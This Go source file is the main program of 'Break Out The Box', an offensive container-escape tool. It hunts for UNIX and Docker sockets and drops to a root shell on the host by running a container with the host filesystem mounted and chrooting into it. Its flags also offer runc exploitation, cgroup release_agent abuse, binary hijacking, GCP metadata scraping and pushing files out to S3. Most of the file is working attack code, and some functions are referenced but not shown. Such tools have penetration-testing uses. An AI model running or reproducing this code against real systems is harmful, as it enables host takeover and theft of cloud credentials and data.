package main

import (
	"archive/tar"
	"compress/gzip"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"syscall"
	"time"

	"github.com/kr/pty"
	"github.com/tv42/httpunix"
	"golang.org/x/crypto/ssh/terminal"
)

var verbosePtr, huntSockPtr, huntHttpPtr, huntDockerPtr, interfacesPtr, toJsonPtr, autopwnPtr, cicdPtr, reconPtr, metaDataPtr, findDockerdPtr, scrapeGcpMeta *bool

var validSocks []string

var exitCode int
var pathPtr, aggressivePtr, hijackPtr, wordlistPtr, endpointList, pushToS3ptr, s3BucketPtr, awsRegionPtr, cgroupPtr *string

type IpAddress struct {
	Address string
}

type Interface struct {
	Name      string
	Addresses []IpAddress
}

func main() {
	fmt.Println("[+] Break Out The Box")
	exitCode = 0
	log.SetFlags(log.LstdFlags | log.Lmicroseconds)

	pathPtr = flag.String("path", "/", "Path to Start Scanning for UNIX Domain Sockets")
	verbosePtr = flag.Bool("verbose", false, "Verbose output")
	huntSockPtr = flag.Bool("socket", false, "Hunt for Available UNIX Domain Sockets")
	huntHttpPtr = flag.Bool("findHTTP", false, "Hunt for Available UNIX Domain Sockets with HTTP")
	interfacesPtr = flag.Bool("interfaces", false, "Display available network interfaces")

	autopwnPtr = flag.Bool("autopwn", false, "Attempt to autopwn exposed sockets")
	cicdPtr = flag.Bool("cicd", false, "Attempt to autopwn but don't drop to TTY,return exit code 1 if successful else 0")
	reconPtr = flag.Bool("recon", false, "Perform Recon of the Container ENV")
	metaDataPtr = flag.Bool("metadata", false, "Attempt to find metadata services")
	aggressivePtr = flag.String("aggr", "nil", "Attempt to exploit RuncPWN")
	hijackPtr = flag.String("hijack", "nil", "Attempt to hijack binaries on host")
	wordlistPtr = flag.String("wordlist", "nil", "Provide a wordlist")
	endpointList = flag.String("endpointlist", "nil", "Provide a wordlist")
	findDockerdPtr = flag.Bool("findDockerD", false, "Attempt to find Dockerd")
	pushToS3ptr = flag.String("s3push", "nil", "Push a file to S3 e.g Full command to push to https://YOURBUCKET.s3.eu-west-2.amazonaws.com/FILENAME would be: -region eu-west-2 -s3bucket YOURBUCKET -s3push FILENAME")
	s3BucketPtr = flag.String("s3bucket", "nil", "Provide a bucket name for S3 Push")
	awsRegionPtr = flag.String("region", "nil", "Provide a AWS Region e.g eu-west-2")
	scrapeGcpMeta = flag.Bool("scrapeGCP", false, "Attempt to scrape the GCP metadata service")
	cgroupPtr = flag.String("pwnCgroup", "nil", "Provide a command payload to try exploit --privilege CGROUP release_agent's")

	flag.Parse()

	if *cgroupPtr != "nil" {
		abuseCgroupPriv(*cgroupPtr)
	}

	if *scrapeGcpMeta {
		resp, err := scrapeGcpMetadata("169.254.169.254", "80")
		if err != nil {
			fmt.Println("[ERROR] ", err)
			return
		}
		fmt.Println("[*] Output-> \n", resp)
	}

	if *pushToS3ptr != "nil" {
		if *s3BucketPtr == "nil" {
			fmt.Println("[!] Please provide a bucket name")
			return
		}
		if *awsRegionPtr == "nil" {
			fmt.Println("[!] Please provide a region")
			return
		}
		testUploadOfS3(*pushToS3ptr, *s3BucketPtr, *awsRegionPtr)
	}

	if *findDockerdPtr {
		findDockerD()
	}

	if *huntHttpPtr {
		findHttpSockets()
	}

	if *interfacesPtr {
		huntNetworkInterfaces()
	}

	if *hijackPtr != "nil" {
		hijackBinaries(*hijackPtr)
	}

	if *aggressivePtr != "nil" {
		runcPwn(*aggressivePtr)
	}

	if *reconPtr {
		fmt.Println("[+] Performing Container Recon")
		checkProcEnviron()
		checkEnvVars()
	}

	if *metaDataPtr {
		checkMetadataServices()
	}

	if *autopwnPtr {
		autopwn()
	}

	if *huntSockPtr {
		fmt.Println("[+] Hunting Down UNIX Domain Sockets from:", *pathPtr)
		sockets, _ := getValidSockets(*pathPtr)
		for _, element := range sockets {
			fmt.Println("[!] Valid Socket: " + element)
		}
	}
	fmt.Println("[+] Finished")
	os.Exit(exitCode)
}

func downloadFile(filepath string, url string) error {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: transport}
	resp, err := client.Get(url)
	if err != nil {
		return err
	}

	defer resp.Body.Close()
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, resp.Body)
	return err
}

func dropToTTY(dockerSockPath string) error {
	// this code has been copy+pasted directly from https://github.com/kr/pty, it's that awesome
	cmd := "./docker/docker -H unix://" + dockerSockPath + " run -t -i -v /:/host alpine:latest /bin/sh"
	fmt.Println(cmd)
	c := exec.Command("sh", "-c", cmd)

	// Start the command with a pty.
	ptmx, err := pty.Start(c)
	if err != nil {
		return err
	}

	// Make sure to close the pty at the end.
	defer func() { _ = ptmx.Close() }() // Best effort.

	// Handle pty size.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGWINCH)
	go func() {
		for range ch {
			if err := pty.InheritSize(os.Stdin, ptmx); err != nil {
				log.Printf("error resizing pty: %s", err)
			}
		}
	}()
	ch <- syscall.SIGWINCH // Initial resize.
	go func() {
		ptmx.Write([]byte("chroot /host && clear\n"))
	}()

	// Set stdin in raw mode.
	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		panic(err)
	}
	defer func() { _ = terminal.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort.

	go func() {
		ptmx.Write([]byte("echo 'You are now on the underlying host'\n"))
	}()
	// Copy stdin to the pty and the pty to stdout.
	go func() { _, _ = io.Copy(ptmx, os.Stdin) }()
	_, _ = io.Copy(os.Stdout, ptmx)
	return nil
}

func untar(dst string, r io.Reader) error {
	// this code has been copy pasted from this great gist https://gist.github.com/sdomino/635a5ed4f32c93aad131#file-untargz-go
	gzr, err := gzip.NewReader(r)
	if err != nil {
		return err
	}
	defer gzr.Close()
	tr := tar.NewReader(gzr)
	for {
		header, err := tr.Next()
		switch {
		// if no more files are found return
		case err == io.EOF:
			return nil
		// return any other error
		case err != nil:
			return err
		// if the header is nil, just skip it (not sure how this happens)
		case header == nil:
			continue
		}
		// the target location where the dir/file should be created
		target := filepath.Join(dst, header.Name)
		// check the file type
		switch header.Typeflag {

		// if its a dir and it doesn't exist create it
		case tar.TypeDir:
			if _, err := os.Stat(target); err != nil {
				if err := os.MkdirAll(target, 0755); err != nil {
					return err
				}
			}
		// if it's a file create it
		case tar.TypeReg:
			f, err := os.OpenFile(target, os.O_CREATE|os.O_RDWR, os.FileMode(header.Mode))
			if err != nil {
				return err
			}
			// copy over contents
			if _, err := io.Copy(f, tr); err != nil {
				return err
			}
			// manually close here after each file operation; defering would cause each file close
			// to wait until all operations have completed.
			f.Close()
		}
	}
}

func getDockerEnabledSockets(socks []string) []string {
	fmt.Println("[+] Hunting Docker Socks")
	var dockerSocks []string
	for _, element := range socks {
		resp, err := checkSock(element)
		if err == nil {
			if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
				dockerSocks = append(dockerSocks, element)
				if *verbosePtr {
					fmt.Println("[+] Valid Docker Socket: " + element)
				}
			} else {
				if *verbosePtr {
					fmt.Println("[+] Invalid Docker Socket: " + element)
				}
			}
			defer resp.Body.Close()
		} else {
			if *verbosePtr {
				fmt.Println("[+] Invalid Docker Socket: " + element)
			}
		}
	}
	return dockerSocks
}

func getHTTPEnabledSockets(socks []string) []string {
	var httpSocks []string
	for _, element := range socks {
		_, err := checkSock(element)
		if err == nil {
			httpSocks = append(httpSocks, element)
			if *verbosePtr {
				fmt.Println("[+] Valid HTTP Socket: " + element)
			}
		} else {
			if *verbosePtr {
				fmt.Println("[+] Invalid HTTP Socket: " + element)
			}
		}
	}
	return httpSocks
}

func walkpath(path string, info os.FileInfo, err error) error {
	if err != nil {
		if *verbosePtr {
			fmt.Println("[ERROR]: ", err)
		}
	} else {
		switch mode := info.Mode(); {
		case mode&os.ModeSocket != 0:
			validSocks = append(validSocks, path)
		default:
			if *verbosePtr {
				fmt.Println("[*] Invalid Socket: " + path)
			}
		}
	}
	return nil
}

func getValidSockets(startPath string) ([]string, error) {
	validSocks = nil
	err := filepath.Walk(startPath, walkpath)
	if err != nil {
		if *verbosePtr {
			fmt.Println("[ERROR]: ", err)
		}
		return nil, err
	}
	return validSocks, nil
}

func checkSock(path string) (*http.Response, error) {
	if *verbosePtr {
		fmt.Println("[-] Checking Sock for HTTP: " + path)
	}

	u := &httpunix.Transport{
		DialTimeout:           100 * time.Millisecond,
		RequestTimeout:        1 * time.Second,
		ResponseHeaderTimeout: 1 * time.Second,
	}
	u.RegisterLocation("dockerd", path)
	var client = http.Client{
		Transport: u,
	}
	resp, err := client.Get("http+unix://dockerd/info")

	if resp == nil {
		return nil, err
	}
	return resp, nil
}

func debug(data []byte, err error) {
	if err == nil {
		fmt.Printf("%s\n\n", data)
	} else {
		log.Fatalf("%s\n\n", err)
	}
}
